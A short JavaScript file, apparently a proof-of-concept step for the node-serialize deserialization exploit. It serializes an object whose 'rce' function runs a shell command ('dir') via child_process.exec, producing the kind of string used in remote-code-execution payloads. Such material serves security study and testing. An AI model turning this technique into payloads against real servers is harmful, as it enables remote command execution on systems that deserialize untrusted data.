
import serialize from "node-serialize";
import { exec } from 'child_process';

console.log("begin")
const y = {
    rce : function(){
        exec('dir', function(error, stdout, stderr) { console.log(stdout) });
        },
}


const p = serialize.serialize(y);
console.log(p);
